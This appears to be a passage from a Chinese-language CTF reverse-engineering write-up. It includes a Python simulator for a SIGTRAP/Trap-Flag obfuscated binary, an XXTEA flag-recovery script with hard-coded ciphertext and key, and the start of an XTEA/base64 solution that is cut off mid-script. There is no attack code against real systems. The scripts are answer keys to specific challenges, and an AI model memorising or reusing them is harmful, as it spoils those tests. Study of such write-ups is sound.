class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;Quick-and-dirty simulator for the SIGTRAP bitmap scheduler used by `new_re`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The binary flips the Trap Flag (TF) on during `.init_array`, then relies on the</span></span><br><span class="line"><span class="string">SIGTRAP handler at 0x400EF0 to redirect execution according to a bitmap located</span></span><br><span class="line"><span class="string">at 0x403080.  This script recreates the interesting pieces statically:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">* Parse `new_re` as an ELF64 to grab the PT_LOAD segments we care about.</span></span><br><span class="line"><span class="string">* Slice out the instruction bytes for the range [BASE, END) = [0x400800, 0x400FF5).</span></span><br><span class="line"><span class="string">* Slice out the bitmap backing the handler.</span></span><br><span class="line"><span class="string">* Optionally produce the &quot;logical&quot; execution trace by emulating the handler&#x27;s</span></span><br><span class="line"><span class="string">  behaviour (currently treating the bitmap as circular when scanning backwards,</span></span><br><span class="line"><span class="string">  which matches the behaviour observed in practice for this binary).</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The goal is to give you a mechanically reproducible listing of the addresses the</span></span><br><span class="line"><span class="string">program really executes once TF + the handler are accounted for.  You can then</span></span><br><span class="line"><span class="string">feed that address sequence back into IDA (set breakpoints, mark basic blocks,</span></span><br><span class="line"><span class="string">copy/paste into a notebook, etc.) and recover the high-level algorithm far more</span></span><br><span class="line"><span class="string">easily than eyeballing the red blocks.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Usage examples (run from repository root):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    python tools/trap_sim.py --head 120</span></span><br><span class="line"><span class="string">    python tools/trap_sim.py --dump-trace trace.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The `--head` option limits how many steps are printed to stdout.  The</span></span><br><span class="line"><span class="string">`--dump-trace` option writes the full trace (address, TF state, mnemonic,</span></span><br><span class="line"><span class="string">operands) to a file so you can inspect it offline.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Dict</span>, Iterable, Iterator, <span class="type">List</span>, <span class="type">Sequence</span>, <span class="type">Tuple</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> Cs, CS_ARCH_X86, CS_MODE_64  <span class="comment"># type: ignore</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Constants recovered from reverse engineering the handler.</span></span><br><span class="line">BASE_ADDR = <span class="number">0x400800</span></span><br><span class="line">END_ADDR = <span class="number">0x400FF5</span></span><br><span class="line">BITMAP_ADDR = <span class="number">0x403080</span></span><br><span class="line">MAIN_ENTRY = <span class="number">0x400DF1</span></span><br><span class="line">TF_TOGGLE_STUB = <span class="number">0x400800</span>  <span class="comment"># same gadget is used to flip TF on/off</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># ELF helpers</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ElfImage</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Minimal ELF loader for pulling bytes from PT_LOAD segments.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, blob: <span class="built_in">bytes</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>._blob = blob</span><br><span class="line">        <span class="variable language_">self</span>._segments: <span class="type">List</span>[<span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>]] = []  <span class="comment"># (start, end, file_off)</span></span><br><span class="line">        <span class="variable language_">self</span>._build_segments()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_build_segments</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        blob = <span class="variable language_">self</span>._blob</span><br><span class="line">        e_phoff = struct.unpack_from(<span class="string">&quot;&lt;Q&quot;</span>, blob, <span class="number">0x20</span>)[<span class="number">0</span>]</span><br><span class="line">        e_phentsize = struct.unpack_from(<span class="string">&quot;&lt;H&quot;</span>, blob, <span class="number">0x36</span>)[<span class="number">0</span>]</span><br><span class="line">        e_phnum = struct.unpack_from(<span class="string">&quot;&lt;H&quot;</span>, blob, <span class="number">0x38</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(e_phnum):</span><br><span class="line">            off = e_phoff + i * e_phentsize</span><br><span class="line">            p_type = struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, blob, off)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> p_type != <span class="number">1</span>:  <span class="comment"># PT_LOAD</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            p_offset = struct.unpack_from(<span class="string">&quot;&lt;Q&quot;</span>, blob, off + <span class="number">8</span>)[<span class="number">0</span>]</span><br><span class="line">            p_vaddr = struct.unpack_from(<span class="string">&quot;&lt;Q&quot;</span>, blob, off + <span class="number">16</span>)[<span class="number">0</span>]</span><br><span class="line">            p_filesz = struct.unpack_from(<span class="string">&quot;&lt;Q&quot;</span>, blob, off + <span class="number">32</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="variable language_">self</span>._segments.append((p_vaddr, p_vaddr + p_filesz, p_offset))</span><br><span class="line">        <span class="variable language_">self</span>._segments.sort()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self, addr: <span class="built_in">int</span>, size: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="keyword">for</span> start, end, file_off <span class="keyword">in</span> <span class="variable language_">self</span>._segments:</span><br><span class="line">            <span class="keyword">if</span> start &lt;= addr &lt; end <span class="keyword">and</span> addr + size &lt;= end:</span><br><span class="line">                rel = addr - start</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">self</span>._blob[file_off + rel : file_off + rel + size]</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;address 0x<span class="subst">&#123;addr:x&#125;</span> (size <span class="subst">&#123;size&#125;</span>) not backed by PT_LOAD&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># Trap handler model</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TrapScheduler</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Model the bitmap-driven rerouting implemented by the SIGTRAP handler.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, elf: ElfImage</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>._elf = elf</span><br><span class="line">        <span class="variable language_">self</span>._md = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line">        <span class="variable language_">self</span>._md.detail = <span class="literal">False</span></span><br><span class="line">        <span class="variable language_">self</span>._bitmap = elf.read(BITMAP_ADDR, (END_ADDR - BASE_ADDR + <span class="number">7</span>) // <span class="number">8</span>)</span><br><span class="line">        <span class="variable language_">self</span>._marks = [</span><br><span class="line">            BASE_ADDR + i</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(END_ADDR - BASE_ADDR)</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">self</span>._bitmap[i &gt;&gt; <span class="number">3</span>] &gt;&gt; (i &amp; <span class="number">7</span>)) &amp; <span class="number">1</span></span><br><span class="line">        ]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>._marks:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;bitmap produced zero marked addresses&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>._mark_index: <span class="type">Dict</span>[<span class="built_in">int</span>, <span class="built_in">int</span>] = &#123;addr: idx <span class="keyword">for</span> idx, addr <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="variable language_">self</span>._marks)&#125;</span><br><span class="line">        <span class="variable language_">self</span>._cache: <span class="type">Dict</span>[<span class="built_in">int</span>, Cs.Instruction] = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_marked</span>(<span class="params">self, addr: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">if</span> addr &lt; BASE_ADDR <span class="keyword">or</span> addr &gt;= END_ADDR:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        off = addr - BASE_ADDR</span><br><span class="line">        <span class="keyword">return</span> ((<span class="variable language_">self</span>._bitmap[off &gt;&gt; <span class="number">3</span>] &gt;&gt; (off &amp; <span class="number">7</span>)) &amp; <span class="number">1</span>) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_find_prev</span>(<span class="params">self, addr: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        idx = <span class="variable language_">self</span>._mark_index[addr]</span><br><span class="line">        <span class="comment"># The hardware walks backwards until the *second* set bit.  The bitmap</span></span><br><span class="line">        <span class="comment"># provided by the challenge is arranged such that treating the mark list</span></span><br><span class="line">        <span class="comment"># as circular reproduces the observed jumps.</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._marks[(idx - <span class="number">2</span>) % <span class="built_in">len</span>(<span class="variable language_">self</span>._marks)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">disasm</span>(<span class="params">self, addr: <span class="built_in">int</span></span>) -&gt; Cs.Instruction:</span><br><span class="line">        <span class="keyword">if</span> addr <span class="keyword">not</span> <span class="keyword">in</span> <span class="variable language_">self</span>._cache:</span><br><span class="line">            <span class="variable language_">self</span>._cache[addr] = <span class="built_in">next</span>(<span class="variable language_">self</span>._md.disasm(<span class="variable language_">self</span>._elf.read(addr, <span class="number">16</span>), addr, count=<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>._cache[addr]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">simulate</span>(<span class="params">self, max_steps: <span class="built_in">int</span> = <span class="number">500</span></span>) -&gt; <span class="type">List</span>[<span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">bool</span>, Cs.Instruction]]:</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Return a list of (address, tf_on, instruction) for the pseudo-execution.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        trace: <span class="type">List</span>[<span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">bool</span>, Cs.Instruction]] = []</span><br><span class="line">        tf_on = <span class="literal">True</span></span><br><span class="line">        rip = MAIN_ENTRY</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(max_steps):</span><br><span class="line">            ins = <span class="variable language_">self</span>.disasm(rip)</span><br><span class="line">            trace.append((rip, tf_on, ins))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> tf_on <span class="keyword">and</span> <span class="variable language_">self</span>.is_marked(rip):</span><br><span class="line">                rip = <span class="variable language_">self</span>._find_prev(rip)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                rip += ins.size</span><br><span class="line"></span><br><span class="line">            <span class="comment"># The gadget at 0x400800 flips TF via pushfq/xor/popfq.</span></span><br><span class="line">            <span class="keyword">if</span> ins.mnemonic == <span class="string">&quot;call&quot;</span> <span class="keyword">and</span> ins.op_str.strip().lower() == <span class="string">f&quot;0x<span class="subst">&#123;TF_TOGGLE_STUB:x&#125;</span>&quot;</span>:</span><br><span class="line">                tf_on = <span class="keyword">not</span> tf_on</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> trace</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># CLI plumbing</span></span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">format_trace_row</span>(<span class="params">addr: <span class="built_in">int</span>, tf_on: <span class="built_in">bool</span>, ins: Cs.Instruction</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    flag = <span class="string">&quot;TF&quot;</span> <span class="keyword">if</span> tf_on <span class="keyword">else</span> <span class="string">&quot;  &quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;0x<span class="subst">&#123;addr:08x&#125;</span> [<span class="subst">&#123;flag&#125;</span>] <span class="subst">&#123;ins.mnemonic:&lt;<span class="number">8</span>&#125;</span> <span class="subst">&#123;ins.op_str&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv: <span class="type">Sequence</span>[<span class="built_in">str</span>] | <span class="literal">None</span> = <span class="literal">None</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;Simulate the SIGTRAP-driven control flow&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--binary&quot;</span>, default=<span class="string">&quot;new_re&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;path to the ELF binary (default: new_re)&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--head&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">40</span>, <span class="built_in">help</span>=<span class="string">&quot;print the first N steps to stdout&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--steps&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">500</span>, <span class="built_in">help</span>=<span class="string">&quot;total number of steps to simulate&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--dump-trace&quot;</span>, <span class="built_in">type</span>=Path, <span class="built_in">help</span>=<span class="string">&quot;optional file to dump the full trace&quot;</span>)</span><br><span class="line">    args = parser.parse_args(argv)</span><br><span class="line"></span><br><span class="line">    blob = Path(args.binary).read_bytes()</span><br><span class="line">    scheduler = TrapScheduler(ElfImage(blob))</span><br><span class="line">    trace = scheduler.simulate(max_steps=args.steps)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> addr, tf_on, ins <span class="keyword">in</span> trace[: args.head]:</span><br><span class="line">        <span class="built_in">print</span>(format_trace_row(addr, tf_on, ins))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> args.dump_trace:</span><br><span class="line">        args.dump_trace.parent.mkdir(parents=<span class="literal">True</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">with</span> args.dump_trace.<span class="built_in">open</span>(<span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> fh:</span><br><span class="line">            <span class="keyword">for</span> addr, tf_on, ins <span class="keyword">in</span> trace:</span><br><span class="line">                fh.write(format_trace_row(addr, tf_on, ins) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] wrote <span class="subst">&#123;<span class="built_in">len</span>(trace)&#125;</span> trace entries to <span class="subst">&#123;args.dump_trace&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251106204215477.png"></p><p>把dump下来的内容再丢给ai分析，编写解密脚本</p><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;Recover the flag produced by the protected binary.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"></span><br><span class="line">DELTA = <span class="number">0x9E3779B9</span></span><br><span class="line">MASK32 = <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xxtea_decrypt</span>(<span class="params">words: <span class="built_in">list</span>[<span class="built_in">int</span>], key: <span class="built_in">list</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">list</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Decrypt a vector of 32-bit words in-place using the XXTEA core.&quot;&quot;&quot;</span></span><br><span class="line">    n = <span class="built_in">len</span>(words)</span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> words</span><br><span class="line"></span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> // n</span><br><span class="line">    total = (rounds * DELTA) &amp; MASK32</span><br><span class="line"></span><br><span class="line">    y = words[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">while</span> total:</span><br><span class="line">        e = (total &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            z = words[p - <span class="number">1</span>]</span><br><span class="line">            y_val = words[p]</span><br><span class="line">            mix = (((z &gt;&gt; <span class="number">5</span>) ^ ((y &lt;&lt; <span class="number">2</span>) &amp; MASK32)) + ((y &gt;&gt; <span class="number">3</span>) ^ ((z &lt;&lt; <span class="number">4</span>) &amp; MASK32))) &amp; MASK32</span><br><span class="line">            mix ^= (total ^ y) + (key[(p &amp; <span class="number">3</span>) ^ e] ^ z)</span><br><span class="line">            y = (y_val - mix) &amp; MASK32</span><br><span class="line">            words[p] = y</span><br><span class="line">        z = words[n - <span class="number">1</span>]</span><br><span class="line">        mix = (((z &gt;&gt; <span class="number">5</span>) ^ ((y &lt;&lt; <span class="number">2</span>) &amp; MASK32)) + ((y &gt;&gt; <span class="number">3</span>) ^ ((z &lt;&lt; <span class="number">4</span>) &amp; MASK32))) &amp; MASK32</span><br><span class="line">        mix ^= (total ^ y) + (key[(<span class="number">0</span> &amp; <span class="number">3</span>) ^ e] ^ z)</span><br><span class="line">        y = (words[<span class="number">0</span>] - mix) &amp; MASK32</span><br><span class="line">        words[<span class="number">0</span>] = y</span><br><span class="line">        total = (total - DELTA) &amp; MASK32</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> words</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">words_to_bytes</span>(<span class="params">words: <span class="built_in">list</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Pack little-endian words into a byte string.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;&quot;</span>.join(word.to_bytes(<span class="number">4</span>, <span class="string">&quot;little&quot;</span>) <span class="keyword">for</span> word <span class="keyword">in</span> words)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="comment"># Constants lifted directly from the comparison stage in the binary.</span></span><br><span class="line">    cipher = [</span><br><span class="line">        <span class="number">0x2973BD37</span>,</span><br><span class="line">        <span class="number">0x1BA99AA3</span>,</span><br><span class="line">        <span class="number">0xB3C20088</span>,</span><br><span class="line">        <span class="number">0xBFC393AB</span>,</span><br><span class="line">        <span class="number">0x352ADCCF</span>,</span><br><span class="line">        <span class="number">0x3B98E6E6</span>,</span><br><span class="line">        <span class="number">0xAE421991</span>,</span><br><span class="line">        <span class="number">0xD7B702CF</span>,</span><br><span class="line">        <span class="number">0x0EEF6889</span>,</span><br><span class="line">        <span class="number">0x08662435</span>,</span><br><span class="line">    ]</span><br><span class="line">    key = [<span class="number">0x0000DEAD</span>, <span class="number">0x0000BEEF</span>, <span class="number">0x00005A7D</span>, <span class="number">0x0000C0FF</span>]</span><br><span class="line"></span><br><span class="line">    plain_words = xxtea_decrypt(cipher[:], key)</span><br><span class="line">    flag = words_to_bytes(plain_words).rstrip(<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag.decode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div><h3 id="re-encode"><a href="#re-encode" class="headerlink" title="re-encode"></a>re-encode</h3><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251106212043181.png"></p><p>scanf中有一个xtea加密</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251106212114339.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251106212136170.png"></p><p>最后在compare里面有一个base64</p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251106212227748.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://gypsophila2j.oss-cn-beijing.aliyuncs.com/20251106213320145.png"></p><p>解密脚本如下</p><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xtea_decrypt</span>(<span class="params">block, key</span>):</span><br><span class="line">    v0, v1 = struct.unpack(<span class="string">&#x27;&gt;2I&#x27;</span>, block)</span><br><span class="line">    k = struct.unpack(<span class="string">&#x27;&gt;4I&#x27;</span>, key)</span><br><span class="line">    delta = -<span class="number">0x61C88647</span></span><br><span class="line">    <span class="built_in">sum</span> = delta * <span class="number">32</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (<span class="built_in">sum</span> + k[(<span class="built_in">sum</span> &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>])</span><br><span class="line">        v1 &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">        <span class="built_in">sum</span> -= delta</span><br><span 